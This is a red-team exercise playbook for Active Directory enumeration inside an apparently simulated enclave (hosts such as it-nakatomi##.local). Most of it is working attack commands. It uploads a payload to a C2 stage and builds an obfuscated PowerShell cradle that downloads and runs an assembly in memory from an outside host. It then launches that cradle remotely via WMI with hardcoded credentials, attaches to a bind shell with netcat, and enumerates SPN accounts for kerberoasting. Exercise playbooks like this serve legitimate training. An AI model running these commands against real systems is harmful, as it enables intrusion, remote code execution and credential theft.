# Advanced Enumeration
`[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()`
## **Playbook ID: 4.05** - T1087.002 - Internal Enumeration using [ADSI] - **MSEL Event ID: AT1-5**

Target: it-user10

This will run through the merlin socks5 proxy on the **HTTPS server, Redirector 2, Lane 2** from your **KALI OPERATOR BOX**

1. Download the "something_cool.exe" from the file share: 172.16.2.2:8080/rush_hour/something_cool.exe to your kalib operator box.

2. Upload the something_cool.exe payload to the captain america webstage.

```sh
cd ~/Downloads
curl -k -X POST https://192.168.4.155:443/upload -F "file=@./something_cool.exe" -H "Content-Type: multipart/form-data" -H "Key: ironcatstomorrowneverdies" -v
```

> Use the output to craft the payload in the subsequent steps. Remember just use the random string, not the "/payloads".

1. Prepare to enumerate the IT domain using a subsequent shell, pull back the information to your device and document so you are situationally aware. To do this, prepare another download cradle for the `shell.exe` binary. In contrast to the previous cradle, this will be used to download and invoke the shell in memory. Use the following command to base64 encode the cradle. 

```sh
echo 'try{[net.servicepointmanager]::servercertificatevalidationcallback={$true};[reflection.assembly]::load([net.webclient]::new().downloaddata("https://captainamerica.org/java/<path here>")).entrypoint.invoke(0,((,$null)));}catch{};'|iconv -f ASCII -t UTF-16LE -|base64 -w0 > cradle.txt

echo $(cat cradle.txt)
```

2. Leverage the command to invoke the custom PowerShell runspace within the bind-shell on port 65535 of the it-users-win10 computer (the default port). Replace the `<paste here>` string in the command below with the base64 cradle from the previous step, then execute the command on it-users-win10 using WMI. This will de-chain the previous attack using the Merlin agent from the current enumeration process. Once the command has executed, use proxychains to connect to the shell on port 65535.   

**Change the DOMAIN in the commmand with ## to your Enclave**

```shell 
> proxychains -q impacket-wmiexec -ts -debug -nooutput -silentcommand $DOMAIN/$USER:$PASSWORD@172.23.1.80 \
'c:\windows\system32\wbem\wmic.exe /node:172.23.3.110 /user:"it-nakatomi##.local\webadmin" /password:"Vr6F#x@9c2" /privileges:enable process call create "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -ex b -w h -enc  <paste here>"'

> proxychains -q nc -v 172.23.3.110 65535
```

_If this doesn't work, within Merlin, run:_

```sh
upload something_cool.exe
run something_cool.exe
```

**IN THE INTERACTIVE SHELL IF YOU HAVE PROBLEMS USE THE COMMAND `reset` AND START AGAIN**


**ENSURE YOU CHANGE THE ## to YOUR ENCLAVE NUMBER**

3. Now that we have fully interactive access in the PowerShell runspace, we will enumerate the IT domain for potential targets. To ensure the commands are executed under a Kerberos authenticated context, use the `[runas.program]` class pre-loaded into the bindshell. The convention for authenticated commands is `[runas.program]::netonly(("<domain>","<username>","<password>","<command>"))`. All other commands will be executed from the local context of the process. 
```

[runas.program]::netonly(("it-nakatomi##.local","webadmin","Vr6F#x@9c2","([adsisearcher]'(&(objectCategory=user))').findall()|convertto-json"));

[runas.program]::netonly(("it-nakatomi##.local","webadmin","Vr6F#x@9c2","([adsisearcher]'(&(objectCategory=Computer))').findall()|convertto-json"));
```
4. Previous enumeration reveals several domain users and computers with Service Principal Names (SPNs). To determine which accounts could be targeted for a kerberoasting attack, perform an LDAP query for all users assigned SPNs in order to generate a list of their SAM account names (this is needed later).  
```
[runas.program]::netonly(("it-nakatomi##.local","webadmin","Vr6F#x@9c2",'[string[]]$sams=([adsisearcher]"(&(objectCategory=user)(serviceprincipalname=*))").findall()|%{$_.properties["samaccountname"]};$sams'));
```


<details><summary> OPTIONAL METHOD THAT IS MORE NOISY USING FULL SHELL</summary>

- 🎯 **Target:** it-user10

This will run through the merlin socks5 proxy, leveraging either schduled tasks or the regcmds in previous events.

1. First you want to enumerate, pull back the information to your device and document so you are situationally aware.
   
   ```ps1
    ([adsisearcher]"objectcategory=user").findall()
    ([adsisearcher]"objectcategory=computer").findall()
    ([adsisearcher]"serviceprincipalname=*").findall().properties.serviceprincipalname
    (([adsisearcher]"serviceprincipalname=*").findall(),properties)|fl*
   ```
   
2. Now with the domain user, collect accounts with SPNs.
 
    ```ps1
    $search = New-Object DirectoryServices.DirectorySearcher([ADSI]"") 
    $search.filter = "(&(servicePrincipalName=*)(objectCategory=user))" 
    $results = $search.Findall() 
    foreach ($results in $results) { $u = $results.GetDirectoryEntry(); $u.name; $u.samaccountname; foreach ($s in $u.servicePrincipalName) { $s; } Write-Host "---";}
    ```
</details>
